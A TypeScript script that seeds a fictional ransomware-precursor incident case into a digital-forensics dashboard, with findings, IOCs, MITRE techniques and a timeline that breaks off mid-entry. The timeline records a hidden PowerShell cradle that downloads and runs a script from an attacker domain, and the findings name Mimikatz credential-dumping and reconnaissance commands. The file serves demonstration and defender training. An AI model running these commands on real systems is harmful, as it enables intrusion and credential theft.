// Seed a rich demo case for DFIR Companion presentations.
// Scenario: "GlobalTech Industries — BEC & Ransomware Precursor, May 2026"
// Populates every dashboard section: timeline, findings, IOCs, MITRE, threads,
// questions, next-steps, evidence chain, triage tags, comments, report meta,
// customer exposure, synth/import banners, and scope/legitimate markers.
//
//   npm run seed-demo
//   npm run seed-demo -- --force            overwrite if already exists
//   npm run seed-demo -- --case-id demo2    use a different id
import { config as loadDotenv } from "dotenv";
import { writeFile, mkdir, appendFile, stat } from "node:fs/promises";
import { join, resolve, isAbsolute } from "node:path";
import { fileURLToPath } from "node:url";

// Load .env so DFIR_CASES_ROOT matches the server — otherwise the demo lands in companion/cases
// while the server reads from the configured root, and the dashboard shows no case.
loadDotenv();

const CASE_ID_DEFAULT = "demo";

function arg(name: string): string | undefined {
  const i = process.argv.indexOf(`--${name}`);
  return i !== -1 && process.argv[i + 1] ? process.argv[i + 1] : undefined;
}
const CASE_ID = arg("case-id") ?? CASE_ID_DEFAULT;
const FORCE = process.argv.includes("--force");

const companionDir = fileURLToPath(new URL("../", import.meta.url));
const rawRoot = process.env.DFIR_CASES_ROOT ?? "cases";
const CASES_ROOT = isAbsolute(rawRoot) ? rawRoot : resolve(companionDir, rawRoot);
const CASE_DIR = join(CASES_ROOT, CASE_ID);

async function exists(p: string): Promise<boolean> {
  try { await stat(p); return true; } catch { return false; }
}

async function write(p: string, data: unknown): Promise<void> {
  await writeFile(p, JSON.stringify(data, null, 2), "utf8");
}

// ── timestamps ──────────────────────────────────────────────────────────────
// Incident window: May 15–22 2026. Case created May 22. Today = June 9.
function ts(day: number, h: number, m = 0, s = 0): string {
  return new Date(`2026-05-${String(day).padStart(2, "0")}T${String(h).padStart(2, "0")}:${String(m).padStart(2, "0")}:${String(s).padStart(2, "0")}.000Z`).toISOString();
}

// ── fake but plausible hashes ────────────────────────────────────────────────
const SHA_BEACON    = "3b4a5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b";
const SHA_MIMIKATZ  = "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2";
const SHA_PAYLOAD   = "f7e6d5c4b3a29180f7e6d5c4b3a29180f7e6d5c4b3a29180f7e6d5c4b3a29180";
const SHA_RANSOM    = "deadbeef1234567890abcdef1234567890abcdef1234567890abcdef12345678";
const SHA_DROPPER   = "cafe0001002003004005006007008009000a000b000c000d000e000f0010001100";
const MD5_BEACON    = "9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d";
const MD5_MIMIKATZ  = "4d3c2b1a0f9e8d7c6b5a4938271605f4";

async function main(): Promise<void> {
  // ── guard ──────────────────────────────────────────────────────────────────
  if (await exists(join(CASE_DIR, "case.json"))) {
    if (!FORCE) {
      console.error(`Case "${CASE_ID}" already exists. Pass --force to overwrite.`);
      process.exit(1);
    }
    console.log(`Overwriting existing case "${CASE_ID}"…`);
  }

  // ── directories ────────────────────────────────────────────────────────────
  for (const sub of ["screenshots", "metadata", "state", "reports", "imports"]) {
    await mkdir(join(CASE_DIR, sub), { recursive: true });
  }

  // ── case.json ──────────────────────────────────────────────────────────────
  await write(join(CASE_DIR, "case.json"), {
    caseId: CASE_ID,
    name: "GlobalTech Industries — BEC & Ransomware Precursor",
    createdAt: "2026-05-22T14:00:00.000Z",
    investigator: "Demo Analyst",
    aiProvider: "anthropic",
  });

  // ── investigation.json ─────────────────────────────────────────────────────
  const investigation = {
    caseId: CASE_ID,
    updatedAt: "2026-05-22T14:00:00.000Z",

    lastSummary:
      "GlobalTech Industries suffered a targeted intrusion beginning May 15 2026 via a " +
      "spear-phishing email carrying a malicious Excel macro. The macro spawned a PowerShell " +
      "stager that downloaded and executed a Cobalt Strike beacon (svchost32.exe), establishing " +
      "C2 to 185.220.101.47. The attacker moved laterally to the domain controller (DC01) using " +
      "PsExec, executed Mimikatz to dump domain administrator credentials, then spread to the " +
      "file server (FS01) and web server (WEB01). Approximately 2.3 GB of files were staged and " +
      "a partial HTTPS exfiltration to the C2 succeeded on May 18. A ransomware payload " +
      "(encrypt.exe) was deployed on May 19 but blocked by the EDR on all three targets. " +
      "No evidence of ransomware execution was found. Incident containment actions are in progress.",

    attackerPath:
      "1. **Initial Access (T1566.001)** — May 15 09:14: Spear-phishing email delivered to " +
      "jsmith@globaltech.com with malicious Excel attachment 'Q1-2026-Invoice.xlsm'.\n" +
      "2. **Execution (T1204.002 / T1059.001)** — May 15 09:48: jsmith opened the attachment; " +
      "Excel macro executed, spawning cmd.exe → powershell.exe -NoP -W Hidden.\n" +
      "3. **C2 Deployment (T1105 / T1071.001)** — May 15 09:49–09:51: PowerShell downloaded " +
      "svchost32.exe from cdn-update.microsofttech.net, wrote it to C:\\Windows\\Temp\\, " +
      "executed it; Cobalt Strike beacon established HTTPS C2 to 185.220.101.47:443.\n" +
      "4. **Persistence (T1053.005)** — May 15 10:15: Scheduled task 'MicrosoftEdgeUpdateCore' " +
      "created to run update.dll via rundll32 at every user logon.\n" +
      "5. **Process Injection (T1055)** — May 15 10:45: Beacon injected into legitimate svchost.exe.\n" +
      "6. **Discovery (T1016 / T1018)** — May 15 11:30: nltest /dclist and net user /domain " +
      "queries enumerated the domain and located DC01.\n" +
      "7. **Lateral Movement to DC01 (T1021.002)** — May 16 08:22: PsExec used with current " +
      "credentials to execute a shell on DC01; remote SYSTEM service installed.\n" +
      "8. **Credential Dumping (T1003.001)** — May 16 08:45: Mimikatz sekurlsa::logonpasswords " +
      "executed on DC01; LSASS process memory accessed and domain admin hashes extracted.\n" +
      "9. **Lateral Movement to FS01 + WEB01 (T1021.002)** — May 16 10:00: Domain admin " +
      "credentials used to access file server and web server via SMB.\n" +
      "10. **Collection & Staging (T1560.001)** — May 17 14:30–15:45: Files from finance share " +
      "archived to C:\\Windows\\Temp\\backup\\data.7z (2.3 GB).\n" +
      "11. **Exfiltration (T1048.002)** — May 18 02:30–02:31: FTP attempt blocked by firewall; " +
      "HTTPS exfiltration to 185.220.101.47 succeeded (~847 MB before throttle).\n" +
      "12. **Impact Attempt (T1486)** — May 19 22:15–22:17: Ransomware binary (encrypt.exe) " +
      "dropped on FS01; EDR detected and quarantined on first execution attempt.",

    findings: [
      {
        id: "f001",
        severity: "Critical",
        confidence: 97,
        title: "Active Cobalt Strike C2 Beacon — Persistent Backdoor",
        description:
          "A Cobalt Strike stager (svchost32.exe, SHA-256 " + SHA_BEACON + ") was executed on " +
          "WKSTN-JSMITH and injected into svchost.exe. The implant maintained HTTPS C2 to " +
          "185.220.101.47:443 (cobaltkit.xyz) from May 15 09:51 through at least May 22. " +
          "EDR telemetry confirms 47 beacon check-ins over the 7-day window. The beacon " +
          "functioned as the primary C2 channel for lateral movement and staging commands.",
        relatedIocs: ["ioc001", "ioc002", "ioc003", "ioc006", "ioc008"],
        sourceScreenshots: [],
        mitreTechniques: ["T1071.001", "T1105", "T1055"],
        firstSeen: ts(15, 9, 51),
        lastUpdated: ts(22, 8, 0),
        status: "confirmed",
      },
      {
        id: "f002",
        severity: "Critical",
        confidence: 99,
        title: "Domain Administrator Credentials Compromised via Mimikatz",
        description:
          "Mimikatz (SHA-256 " + SHA_MIMIKATZ + ") was executed interactively on DC01 under " +
          "the Cobalt Strike beacon session. The sekurlsa::logonpasswords module dumped NTLM " +
          "hashes and cleartext credentials for 3 domain administrator accounts and 12 service " +
          "accounts from LSASS memory. These credentials were subsequently used for lateral " +
          "movement to FS01 and WEB01. Full credential reset for all privileged accounts is required.",
        relatedIocs: ["ioc005", "ioc009", "ioc013"],
        sourceScreenshots: [],
        mitreTechniques: ["T1003.001"],
        firstSeen: ts(16, 8, 45),
        lastUpdated: ts(22, 8, 0),
        status: "confirmed",
      },
      {
        id: "f003",
        severity: "High",
        confidence: 95,
        title: "Spear-Phishing Email — Initial Access via Malicious Excel Macro",
        description:
          "A spear-phishing email was delivered to jsmith@globaltech.com on May 15 09:14 " +
          "with subject 'Q1-2026 Invoice — Action Required'. The attachment 'Q1-2026-Invoice.xlsm' " +
          "contained an obfuscated VBA macro that bypassed the Mark-of-the-Web prompt. The macro " +
          "executed cmd.exe spawning PowerShell with -NoProfile -WindowStyle Hidden flags, " +
          "downloading the Cobalt Strike stager from cdn-update.microsofttech.net. The sender " +
          "address spoofed a known GlobalTech vendor (accounts@globaltech-vendor.com).",
        relatedIocs: ["ioc003", "ioc011"],
        sourceScreenshots: [],
        mitreTechniques: ["T1566.001", "T1204.002", "T1059.001"],
        firstSeen: ts(15, 9, 14),
        lastUpdated: ts(22, 8, 0),
        status: "confirmed",
      },
      {
        id: "f004",
        severity: "High",
        confidence: 92,
        title: "Lateral Movement via PsExec to DC01, FS01, and WEB01",
        description:
          "PsExec (Sysinternals) was used from WKSTN-JSMITH to execute remote commands on three " +
          "internal targets. DC01 was accessed May 16 08:22 using the initially compromised " +
          "account credentials; FS01 and WEB01 were accessed May 16 10:00–10:05 using domain " +
          "admin credentials obtained from Mimikatz. Service 'PSEXESVC' was created on all " +
          "three targets. Windows Security EventID 7045 (service installed) and 4648 (explicit " +
          "credential logon) corroborate the movement on each host.",
        relatedIocs: ["ioc010", "ioc012", "ioc013", "ioc014"],
        sourceScreenshots: [],
        mitreTechniques: ["T1021.002"],
        firstSeen: ts(16, 8, 22),
        lastUpdated: ts(22, 8, 0),
        status: "confirmed",
      },
      {
        id: "f005",
        severity: "High",
        confidence: 78,
        title: "Data Staging and Partial Exfiltration (~847 MB)",
        description:
          "Files from the finance network share (\\\\FS01\\Finance$) were staged into " +
          "C:\\Windows\\Temp\\backup\\ and compressed with 7-Zip to data.7z (2.3 GB uncompressed). " +
          "A FTP exfiltration attempt on May 18 02:30 was blocked by perimeter firewall rules. " +
          "A subsequent HTTPS POST to 185.220.101.47 was not blocked; firewall logs estimate " +
          "~847 MB transferred before the session was terminated. Exact contents of the " +
          "exfiltrated subset remain unknown pending forensic triage of FS01.",
        relatedIocs: ["ioc001", "ioc002", "ioc015"],
        sourceScreenshots: [],
        mitreTechniques: ["T1560.001", "T1048.002"],
        firstSeen: ts(17, 14, 30),
        lastUpdated: ts(22, 8, 0),
        status: "open",
      },
      {
        id: "f006",
        severity: "Medium",
        confidence: 90,
        title: "Persistence via Scheduled Task 'MicrosoftEdgeUpdateCore'",
        description:
          "A scheduled task named 'MicrosoftEdgeUpdateCore' was created on WKSTN-JSMITH at " +
          "May 15 10:15. The task runs 'rundll32.exe C:\\Users\\jsmith\\AppData\\Roaming\\update.dll,Start' " +
          "at every user logon (HKCU trigger). EventID 4698 in Security.evtx corroborates creation. " +
          "The DLL (SHA-256 " + SHA_DROPPER + ") loads the Cobalt Strike stager on next logon. " +
          "The task is still present on the compromised workstation.",
        relatedIocs: ["ioc007", "ioc008", "ioc009"],
        sourceScreenshots: [],
        mitreTechniques: ["T1053.005"],
        firstSeen: ts(15, 10, 15),
        lastUpdated: ts(22, 8, 0),
        status: "confirmed",
      },
      {
        id: "f007",
        severity: "Medium",
        confidence: 88,
        title: "Ransomware Payload Deployed and Blocked by EDR",
        description:
          "A ransomware binary (encrypt.exe, SHA-256 " + SHA_RANSOM + ") was dropped to " +
          "C:\\Windows\\Temp\\ on FS01, WEB01, and DC01 on May 19 22:15. The EDR (CrowdStrike " +
          "Falcon) detected the binary via behavioral signature on first execution and quarantined " +
          "it on all three hosts within 2 minutes. No files were encrypted. The binary matches " +
          "the BlackCat/ALPHV ransomware family based on static strings and import patterns " +
          "(VirusTotal: 61/73 detections).",
        relatedIocs: ["ioc004"],
        sourceScreenshots: [],
        mitreTechniques: ["T1486"],
        firstSeen: ts(19, 22, 15),
        lastUpdated: ts(22, 8, 0),
        status: "confirmed",
      },
      {
        id: "f008",
        severity: "Low",
        confidence: 85,
        title: "Internal Reconnaissance — Domain and Host Enumeration",
        description:
          "Following initial C2 establishment, the attacker ran standard Windows reconnaissance " +
          "commands: 'nltest /dclist:globaltech.local', 'net user /domain', 'net group \"Domain Admins\" /domain', " +
          "and 'arp -a'. These executed under the jsmith user context from cmd.exe spawned by the " +
          "Cobalt Strike beacon. The enumeration identified DC01 as the domain controller, leading " +
          "directly to the PsExec lateral movement 21 hours later.",
        relatedIocs: ["ioc008"],
        sourceScreenshots: [],
        mitreTechniques: ["T1016", "T1018", "T1069.002"],
        firstSeen: ts(15, 11, 30),
        lastUpdated: ts(22, 8, 0),
        status: "confirmed",
      },
      // f009 — KEV demo: attacker exploited two unpatched CVEs on the internet-facing WEB01 server
      // before the phishing email arrived. CVE-2021-41773 (Apache RCE) and CVE-2021-44228 (Log4Shell)
      // are both in the CISA KEV catalog with "Known" ransomware campaign use — they will appear in
      // the KEV synthesis context block and in report §4.5.1 when the catalog is loaded.
      {
        id: "f009",
        severity: "Critical",
        confidence: 96,
        title: "Internet-Facing WEB01 Exploited via CVE-2021-41773 + CVE-2021-44228 (Both in CISA KEV)",
        description:
          "WEB01 was exploited via two unpatched CVEs before the phishing email was even opened. " +
          "At 08:30 the attacker used CVE-2021-41773 (Apache httpd 2.4.49 path traversal / " +
          "unauthenticated RCE via mod_cgi; CVSS 9.8) to spawn cmd.exe and download a secondary " +
          "Cobalt Strike stager. At 08:55 CVE-2021-44228 (Log4Shell — JNDI LDAP injection in " +
          "Log4j 2.14.1 running under Tomcat) triggered a JNDI callback to the attacker's C2 " +
          "(185.220.101.47:1389). Both CVEs are listed in the CISA Known Exploited Vulnerabilities " +
          "catalog with confirmed use in ransomware campaigns. WEB01 had BOTH vulnerabilities " +
          "unpatched at the time of the incident. Required actions per CISA KEV: apply Apache " +
          "2.4.51+ and Log4j 2.17.1+ patches immediately.",
        relatedIocs: ["ioc001", "ioc016", "ioc017"],
        sourceScreenshots: [],
        mitreTechniques: ["T1190"],
        firstSeen: ts(15, 8, 30),
        lastUpdated: ts(22, 8, 0),
        status: "confirmed",
      },
    ],

    iocs: [
      {
        id: "ioc001",
        type: "ip",
        value: "185.220.101.47",
        firstSeen: ts(15, 9, 51),
        enrichedBy: ["virustotal", "abuseipdb", "huntingch"],
        enrichments: [
          {
            source: "VirusTotal",
            provider: "virustotal",
            verdict: "malicious",
            score: "58/73 detections",
            detections: 58,
            total: 73,
            tags: ["CobaltStrike", "C2"],
            link: "https://www.virustotal.com/gui/ip-address/185.220.101.47",
            fetchedAt: "2026-05-22T10:00:00.000Z",
          },
          {
            source: "AbuseIPDB",
            provider: "abuseipdb",
            verdict: "malicious",
            score: "100% confidence, 2847 reports",
            tags: ["Hacking", "C2"],
            fetchedAt: "2026-05-22T10:01:00.000Z",
          },
          {
            source: "ThreatFox",
            provider: "huntingch",
            verdict: "malicious",
            score: "CobaltStrike C2 — confidence_level: 100",
            tags: ["CobaltStrike"],
            fetchedAt: "2026-05-22T10:02:00.000Z",
          },
        ],
      },
      {
        id: "ioc002",
        type: "domain",
        value: "cobaltkit.xyz",
        firstSeen: ts(15, 9, 51),
        enrichedBy: ["virustotal", "huntingch"],
        enrichments: [
          {
            source: "VirusTotal",
            provider: "virustotal",
            verdict: "malicious",
            score: "42/73 detections",
            detections: 42,
            total: 73,
            tags: ["CobaltStrike", "C2", "Malware"],
            fetchedAt: "2026-05-22T10:03:00.000Z",
          },
          {
            source: "URLhaus",
            provider: "huntingch",
            verdict: "malicious",
            score: "Active malware distribution URL",
            fetchedAt: "2026-05-22T10:04:00.000Z",
          },
        ],
      },
      {
        id: "ioc003",
        type: "domain",
        value: "cdn-update.microsofttech.net",
        firstSeen: ts(15, 9, 49),
        enrichedBy: ["virustotal"],
        enrichments: [
          {
            source: "VirusTotal",
            provider: "virustotal",
            verdict: "suspicious",
            score: "12/73 detections",
            detections: 12,
            total: 73,
            tags: ["Phishing", "Typosquatting"],
            fetchedAt: "2026-05-22T10:05:00.000Z",
          },
        ],
      },
      {
        id: "ioc004",
        type: "hash",
        value: SHA_RANSOM,
        firstSeen: ts(19, 22, 15),
        enrichedBy: ["virustotal", "huntingch"],
        enrichments: [
          {
            source: "VirusTotal",
            provider: "virustotal",
            verdict: "malicious",
            score: "61/73 detections",
            detections: 61,
            total: 73,
            tags: ["BlackCat", "ALPHV", "Ransomware"],
            fetchedAt: "2026-05-22T10:06:00.000Z",
          },
          {
            source: "MalwareBazaar",
            provider: "huntingch",
            verdict: "malicious",
            score: "BlackCat ransomware — tags: ransomware, alphv",
            tags: ["ransomware", "alphv", "BlackCat"],
            fetchedAt: "2026-05-22T10:07:00.000Z",
          },
        ],
      },
      {
        id: "ioc005",
        type: "hash",
        value: SHA_MIMIKATZ,
        firstSeen: ts(16, 8, 43),
        enrichedBy: ["virustotal"],
        enrichments: [
          {
            source: "VirusTotal",
            provider: "virustotal",
            verdict: "malicious",
            score: "65/73 detections",
            detections: 65,
            total: 73,
            tags: ["Mimikatz", "CredentialDumping", "HackTool"],
            fetchedAt: "2026-05-22T10:08:00.000Z",
          },
        ],
      },
      {
        id: "ioc006",
        type: "hash",
        value: SHA_BEACON,
        firstSeen: ts(15, 9, 49),
        enrichedBy: ["virustotal", "huntingch"],
        enrichments: [
          {
            source: "VirusTotal",
            provider: "virustotal",
            verdict: "malicious",
            score: "55/73 detections",
            detections: 55,
            total: 73,
            tags: ["CobaltStrike", "Backdoor", "RAT"],
            fetchedAt: "2026-05-22T10:09:00.000Z",
          },
          {
            source: "MalwareBazaar",
            provider: "huntingch",
            verdict: "malicious",
            score: "CobaltStrike stager",
            tags: ["cobaltstrike"],
            fetchedAt: "2026-05-22T10:10:00.000Z",
          },
        ],
      },
      {
        id: "ioc007",
        type: "file",
        value: "C:\\Users\\jsmith\\AppData\\Roaming\\update.dll",
        firstSeen: ts(15, 10, 15),
        enrichedBy: [],
      },
      {
        id: "ioc008",
        type: "process",
        value: "svchost32.exe",
        firstSeen: ts(15, 9, 50),
        enrichedBy: [],
      },
      {
        id: "ioc009",
        type: "process",
        value: "rundll32.exe",
        firstSeen: ts(15, 10, 16),
        enrichedBy: [],
      },
      {
        id: "ioc010",
        type: "file",
        value: "C:\\Windows\\Temp\\svchost32.exe",
        firstSeen: ts(15, 9, 49),
        enrichedBy: [],
      },
      {
        id: "ioc011",
        type: "url",
        value: "http://cdn-update.microsofttech.net/update/v2/payload.exe",
        firstSeen: ts(15, 9, 49),
        enrichedBy: ["virustotal"],
        enrichments: [
          {
            source: "VirusTotal",
            provider: "virustotal",
            verdict: "malicious",
            score: "28/73 detections",
            detections: 28,
            total: 73,
            tags: ["Phishing", "Downloader"],
            fetchedAt: "2026-05-22T10:11:00.000Z",
          },
        ],
      },
      {
        id: "ioc012",
        type: "ip",
        value: "10.10.20.15",
        firstSeen: ts(16, 8, 22),
        enrichedBy: [],
      },
      {
        id: "ioc013",
        type: "other",
        value: "dc01.globaltech.local",
        firstSeen: ts(16, 8, 22),
        enrichedBy: [],
      },
      {
        id: "ioc014",
        type: "other",
        value: "jsmith@globaltech.com",
        firstSeen: ts(15, 9, 14),
        enrichedBy: [],
      },
      {
        id: "ioc015",
        type: "file",
        value: "C:\\Windows\\Temp\\backup\\data.7z",
        firstSeen: ts(17, 15, 45),
        enrichedBy: [],
      },
      // KEV demo IOCs — CVE IDs as vulnerability indicators so extractCveIds() finds them
      {
        id: "ioc016",
        type: "vulnerability",
        value: "CVE-2021-41773",
        firstSeen: ts(15, 8, 30),
        enrichedBy: [],
      },
      {
        id: "ioc017",
        type: "vulnerability",
        value: "CVE-2021-44228",
        firstSeen: ts(15, 8, 55),
        enrichedBy: [],
      },
    ],

    mitreTechniques: [
      { id: "T1566.001", name: "Spearphishing Attachment",             findingIds: ["f003"] },
      { id: "T1204.002", name: "Malicious File",                       findingIds: ["f003"] },
      { id: "T1059.001", name: "Command and Scripting: PowerShell",    findingIds: ["f003"] },
      { id: "T1105",     name: "Ingress Tool Transfer",                findingIds: ["f001"] },
      { id: "T1071.001", name: "App Layer Protocol: Web Protocols",    findingIds: ["f001"] },
      { id: "T1055",     name: "Process Injection",                    findingIds: ["f001"] },
      { id: "T1003.001", name: "OS Credential Dumping: LSASS Memory",  findingIds: ["f002"] },
      { id: "T1021.002", name: "Remote Services: SMB/Admin Shares",    findingIds: ["f004"] },
      { id: "T1053.005", name: "Scheduled Task/Job: Scheduled Task",   findingIds: ["f006"] },
      { id: "T1560.001", name: "Archive via Utility",                  findingIds: ["f005"] },
      { id: "T1048.002", name: "Exfiltration Over Alternative Protocol",findingIds: ["f005"] },
      { id: "T1016",     name: "System Network Configuration Discovery",findingIds: ["f008"] },
      { id: "T1018",     name: "Remote System Discovery",              findingIds: ["f008"] },
      { id: "T1069.002", name: "Domain Groups",                        findingIds: ["f008"] },
      { id: "T1486",     name: "Data Encrypted for Impact",            findingIds: ["f007"] },
      { id: "T1190",     name: "Exploit Public-Facing Application",    findingIds: ["f009"] },
    ],

    openThreads: [
      {
        id: "t001",
        description: "Confirm full lateral movement scope — are any hosts beyond DC01, FS01, and WEB01 compromised? SIEM east-west traffic analysis pending.",
        status: "open",
        openedAt: ts(22, 10, 0),
        closedAt: null,
      },
      {
        id: "t002",
        description: "Quantify exact exfiltrated data contents. Firewall logs show ~847 MB via HTTPS on May 18. Finance file share inventory needed to determine which records left.",
        status: "open",
        openedAt: ts(22, 10, 5),
        closedAt: null,
      },
      {
        id: "t003",
        description: "Determine initial access vector and whether the phishing email was targeted or opportunistic.",
        status: "closed",
        openedAt: ts(22, 9, 0),
        closedAt: ts(22, 11, 30),
      },
    ],

    keyQuestions: [
      {
        id: "q001",
        question: "What was the initial access vector?",
        status: "answered",
        answer:
          "Spear-phishing email delivered to jsmith@globaltech.com on May 15 09:14 with subject " +
          "'Q1-2026 Invoice — Action Required'. Malicious Excel macro (.xlsm) executed on open. " +
          "Sender spoofed as accounts@globaltech-vendor.com.",
        pointer: "Finding f003; forensic event e002",
      },
      {
        id: "q002",
        question: "When did the attacker first establish persistence?",
        status: "answered",
        answer:
          "Scheduled task 'MicrosoftEdgeUpdateCore' created May 15 10:15, 24 minutes after initial " +
          "execution. Task runs update.dll at every user logon via rundll32.exe.",
        pointer: "Finding f006; forensic event e007; EventID 4698 in Security.evtx",
      },
      {
        id: "q003",
        question: "Which credentials were compromised?",
        status: "partial",
        answer:
          "Three domain administrator accounts confirmed compromised via Mimikatz on DC01 (May 16 " +
          "08:45). Twelve service account NTLMs also extracted. Specific account names pending " +
          "customer confirmation — DC01 Security.evtx 4672/4624 events required.",
        pointer: "Finding f002; forensic event e014; forensic event e015",
      },
      {
        id: "q004",
        question: "What data was exfiltrated and what is the blast radius?",
        status: "partial",
        answer:
          "~847 MB transferred via HTTPS to 185.220.101.47 on May 18 02:30–02:31. Source was " +
          "C:\\Windows\\Temp\\backup\\data.7z (2.3 GB staged from \\\\FS01\\Finance$). Exact " +
          "file contents not yet determined — FS01 forensic triage in progress.",
        pointer: "Finding f005; forensic events e022–e024; firewall logs May 18 02:30",
      },
      {
        id: "q005",
        question: "Were any hosts beyond DC01, FS01, and WEB01 compromised?",
        status: "unknown",
        answer: "",
        pointer: "SIEM east-west SMB traffic analysis; check for PSEXESVC service on all domain hosts",
      },
      {
        id: "q006",
        question: "What was the attacker's ultimate objective?",
        status: "partial",
        answer:
          "Ransomware deployment (encrypt.exe / BlackCat-ALPHV) on May 19 22:15 indicates a " +
          "double-extortion ransomware attack: exfiltrate data, then encrypt for ransom. EDR " +
          "blocked encryption. Whether the actor claims exfiltration regardless of encryption " +
          "failure is unknown.",
        pointer: "Finding f007; forensic events e026–e028",
      },
      {
        id: "q007",
        question: "Is there evidence of prior reconnaissance or earlier compromise before May 15?",
        status: "unknown",
        answer: "",
        pointer: "Review email gateway logs, DNS query logs, and proxy logs for weeks before May 15; check for phishing emails to other users",
      },
      {
        id: "q008",
        question: "Are backdoors or additional persistence mechanisms still active?",
        status: "unknown",
        answer: "",
        pointer: "Run THOR/Chainsaw on all three lateral hosts; check scheduled tasks, services, registry run keys, and WMI subscriptions on DC01, FS01, WEB01",
      },
    ],

    nextSteps: [
      {
        id: "ns001",
        priority: "critical",
        action: "Isolate and image WKSTN-JSMITH immediately",
        rationale:
          "The Cobalt Strike beacon origin workstation may still have an active C2 channel. " +
          "Disk image is needed to recover the full macro, stager, and PowerShell command history.",
        pointer: "WKSTN-JSMITH; C:\\Windows\\Temp\\svchost32.exe; C:\\Users\\jsmith\\AppData\\Roaming\\",
      },
      {
        id: "ns002",
        priority: "critical",
        action: "Reset all domain admin and service account passwords, revoke Kerberos tickets (krbtgt rotation)",
        rationale:
          "Three domain admin NTLMs and 12 service account credentials confirmed dumped from LSASS. " +
          "Active sessions may still exist. krbtgt double-reset prevents Golden Ticket persistence.",
        pointer: "Finding f002; DC01; all privileged accounts in AD",
      },
      {
        id: "ns003",
        priority: "high",
        action: "Collect Security.evtx (4624/4625/4648/4672/7045) from DC01, FS01, and WEB01",
        rationale:
          "EventID 4648 (explicit credential logon) and 7045 (service install) will confirm the " +
          "full PsExec lateral movement path and identify any additional accounts used.",
        pointer: "DC01, FS01, WEB01 — Event logs; Finding f004",
      },
      {
        id: "ns004",
        priority: "high",
        action: "Pull DNS and proxy logs for May 14–22 across all hosts to map full C2 domain resolution",
        rationale:
          "cobaltkit.xyz and cdn-update.microsofttech.net may have resolved from hosts other than " +
          "WKSTN-JSMITH. If so, additional implants likely exist.",
        pointer: "DNS server query logs; proxy/web gateway logs; IOC ioc002, ioc003",
      },
      {
        id: "ns005",
        priority: "medium",
        action: "Run THOR and Chainsaw scan on FS01 and WEB01 for additional implants and persistence",
        rationale:
          "Lateral movement confirmed to both hosts. EDR blocked ransomware but initial implant " +
          "install and additional persistence mechanisms not yet inventoried on either target.",
        pointer: "FS01, WEB01; check scheduled tasks, services, registry runkeys, WMI subscriptions",
      },
      {
        id: "ns006",
        priority: "medium",
        action: "Recover and inventory C:\\Windows\\Temp\\backup\\ on FS01 to determine exfiltrated files",
        rationale:
          "The 847 MB exfiltration came from this staging directory. File listing and timestamps " +
          "will scope the data breach notification obligation.",
        pointer: "FS01; C:\\Windows\\Temp\\backup\\; Finding f005; finance share access logs",
      },
    ],

    forensicTimeline: [
      // Day 1 — Initial Access + C2 Setup
      {
        id: "e001",
        timestamp: ts(15, 9, 14),
        description: "Phishing email received: 'Q1-2026 Invoice — Action Required' from accounts@globaltech-vendor.com with attachment Q1-2026-Invoice.xlsm (22 KB). Spoofed sender; SPF/DKIM failed.",
        severity: "High",
        mitreTechniques: ["T1566.001"],
        relatedFindingIds: ["f003"],
        sourceScreenshots: [],
        asset: "WKSTN-JSMITH",
      },
      {
        id: "e002",
        timestamp: ts(15, 9, 47),
        description: "Excel opened Q1-2026-Invoice.xlsm; user clicked 'Enable Content' to run macro. Excel spawned cmd.exe (pid 4812).",
        severity: "High",
        mitreTechniques: ["T1204.002"],
        relatedFindingIds: ["f003"],
        sourceScreenshots: [],
        asset: "WKSTN-JSMITH",
        processName: "EXCEL.EXE",
        parentName: "explorer.exe",
        action: "execute" as const,
      },
      {
        id: "e003",
        timestamp: ts(15, 9, 48),
        description: "cmd.exe spawned powershell.exe with args: -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://cdn-update.microsofttech.net/init.ps1')\"",
        severity: "Critical",
        mitreTechniques: ["T1059.001"],
        relatedFindingIds: ["f003", "f001"],
        sourceScreenshots: [],
        asset: "WKSTN-JSMITH",
        processName: "powershell.exe",
        parentName: "cmd.exe",
        action: "execute" as const,
      },
      {
        id: "e004",
        timestamp: ts(15, 9, 49),
        description: "PowerShell downloaded payload from http://cdn-update.microsofttech.net/update/v2/payload.exe → wrote C:\\Windows\\Temp\\svchost32.exe (SHA-256: " + SHA_BEACON + ")",
        severity: "Critical",
        mitreTechniques: ["T1105"],
        relatedFindingIds: ["f001", "f003"],
        sourceScreenshots: [],
        asset: "WKSTN-JSMITH",
        sha256: SHA_BEACON,
        md5: MD5_BEACON,
        path: "c:\\windows\\temp\\svchost32.exe",
        action: "write" as const,
        srcIp: "10.10.10.45",
        dstIp: "192.168.100.200",
        port: 80,
      },
      {
        id: "e005",
        timestamp: ts(15, 9, 50),
        description: "svchost32.exe executed from C:\\Windows\\Temp\\ by powershell.exe (pid 5102). Binary is a Cobalt Strike stager packed with Donut.",
        severity: "Critical",
        mitreTechniques: ["T1105"],
        relatedFindingIds: ["f001"],
        sourceScreenshots: [],
        asset: "WKSTN-JSMITH",
        sha256: SHA_BEACON,
        md5: MD5_BEACON,
        path: "c:\\windows\\temp\\svchost32.exe",
        processName: "svchost32.exe",
        parentName: "powershell.exe",
        action: "execute" as const,
        chainCheck: {
          observed: false,
          note: "powershell.exe → svchost32.exe NOT observed in behavioral baseline — anomalous parent",
          checkedAt: "2026-05-22T11:00:00.000Z",
        },
      },
      {
        id: "e006",
        timestamp: ts(15, 9, 51),
        description: "Cobalt Strike beacon established HTTPS C2 to 185.220.101.47:443 (cobaltkit.xyz). First check-in confirmed by firewall egress log. JA3 fingerprint matches CobaltStrike default profile.",
        severity: "Critical",
        mitreTechniques: ["T1071.001"],
        relatedFindingIds: ["f001"],
        sourceScreenshots: [],
        asset: "WKSTN-JSMITH",
        sources: ["CrowdStrike Falcon", "Suricata"],
        srcIp: "10.10.10.45",
        dstIp: "185.220.101.47",
        port: 443,
        action: "network_send" as const,
      },
      {
        id: "e007",
        timestamp: ts(15, 10, 15),
        description: "Scheduled task 'MicrosoftEdgeUpdateCore' created (EventID 4698). Action: rundll32.exe C:\\Users\\jsmith\\AppData\\Roaming\\update.dll,Start. Trigger: At logon of any user.",
        severity: "High",
        mitreTechniques: ["T1053.005"],
        relatedFindingIds: ["f006"],
        sourceScreenshots: [],
        asset: "WKSTN-JSMITH",
        sources: ["Chainsaw"],
      },
      {
        id: "e008",
